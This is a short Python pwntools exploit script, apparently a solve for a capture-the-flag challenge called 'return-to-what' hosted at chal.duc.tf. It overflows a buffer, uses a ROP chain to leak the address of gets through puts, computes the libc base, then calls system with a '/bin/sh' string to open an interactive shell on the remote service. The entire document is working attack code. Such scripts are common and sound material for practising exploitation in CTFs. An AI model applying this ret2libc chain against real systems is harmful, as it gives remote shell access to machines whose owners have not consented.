#!/usr/bin/env python
from pwn import *

context.binary = elf = ELF('return-to-what')
libc = ELF('./libc6_2.27-3ubuntu1_amd64.so')
context.log_level = "debug"
# p = process(elf.path)
# gdb.attach(p, 'init-gef')
p = remote('chal.duc.tf', 30003)
padding = "A"*56

pop_rdi = 0x000000000040122b
ret = 0x0000000000401016

ropchain = flat(
	pop_rdi, elf.got['gets'],
	elf.symbols['puts'],
	elf.symbols['vuln']
)

p.sendlineafter("to return to?\n", padding + ropchain)
libc_base = u64(p.recvline(False).ljust(8, "\x00")) - 0x0800b0

log.info("Libc: 0x{:x}".format(libc_base))

ropchain = flat(
	pop_rdi, libc_base + 0x1b3e9a,
	ret,
	libc_base + 0x04f440,
	elf.symbols['main']
)


p.sendlineafter("to return to?\n", padding + ropchain)

p.interactive()
